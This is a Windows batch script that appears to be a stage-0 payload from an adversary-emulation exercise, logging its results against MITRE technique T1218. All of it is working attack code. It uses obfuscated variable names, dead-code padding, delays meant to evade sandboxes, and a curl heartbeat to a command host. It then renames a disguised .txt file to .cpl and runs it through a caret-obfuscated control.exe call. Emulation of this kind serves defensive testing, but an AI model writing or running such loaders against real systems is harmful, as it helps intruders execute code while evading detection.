@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET yktnwwf=%APPDATA%\8889\bf953104
SET fpakbq=Macula-Stage0-8889
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8889-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=surfshark.txt
SET fpldhe=8889
SET ghphdzc=%APPDATA%\!yydue!\macula-simulations.log

REM Initial random delay
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_complete>> "!ghphdzc!" 2>nul

SET state=0
GOTO lkwqaz

:lkwqaz
IF !state!==0 GOTO xcvsdf
IF !state!==17 GOTO mnbvvc
IF !state!==23 GOTO qweiop
IF !state!==38 GOTO asdzxc
IF !state!==42 GOTO dfghjk
IF !state!==56 GOTO tyuiop
IF !state!==73 GOTO cvbnmc
IF !state!==99 GOTO endlabel
GOTO junkpt1

:junkpt1
SET fake=neverexecuted
EXIT

:xcvsdf
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start>> "!ghphdzc!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_complete>> "!ghphdzc!" 2>nul
ping -n 8 127.0.0.1 >nul
SET state=17
GOTO lkwqaz

:deadpt2
CHOICE /C Y /N /D Y /T 5 >nul
EXIT

:mnbvvc
IF 1==1 (GOTO realmnbv) ELSE (GOTO deadpt2)
:realmnbv
SET /A rdelay=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay_start=!rdelay!s>> "!ghphdzc!" 2>nul
timeout /t !rdelay! /nobreak >nul
SET state=23
GOTO lkwqaz

:qweiop
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: directory_change_start>> "!ghphdzc!" 2>nul
cd /d "!yktnwwf!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: directory_change_complete>> "!ghphdzc!" 2>nul
SET state=38
GOTO lkwqaz

:asdzxc
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_operation_start>> "!ghphdzc!" 2>nul
ren "!edjwtl!" file.cpl >nul 2>&1
IF EXIST file.cpl (
    SET ttpr=1
    SET ttpe=
) ELSE (
    SET ttpr=0
    SET ttpe=rename_failed
)
echo [!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttpr!:!ttpe!>> "!ghphdzc!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_operation_complete=!ttpr!>> "!ghphdzc!" 2>nul
CHOICE /C Y /N /D Y /T 11 >nul
SET state=42
GOTO lkwqaz

:junkpt3
SET unused=moredeadcode
GOTO endlabel

:dfghjk
SET ctrol=c^o^n^t^r^o^l^.^e^x^e
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_start>> "!ghphdzc!" 2>nul
!ctrol! file.cpl >nul 2>&1
SET /A errlvl=!ERRORLEVEL!
IF !errlvl!==0 (
    SET ttpr2=1
    SET ttpe2=
) ELSE (
    SET ttpr2=0
    SET ttpe2=errorlevel_!errlvl!
)
echo [!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttpr2!:!ttpe2!>> "!ghphdzc!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_complete=!ttpr2!>> "!ghphdzc!" 2>nul
SET state=99
GOTO lkwqaz

:tyuiop
timeout /t 6 /nobreak >nul
GOTO dfghjk

:cvbnmc
REM Dead code block
SET garbage=data
GOTO junkpt3

:endlabel
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_terminated>> "!ghphdzc!" 2>nul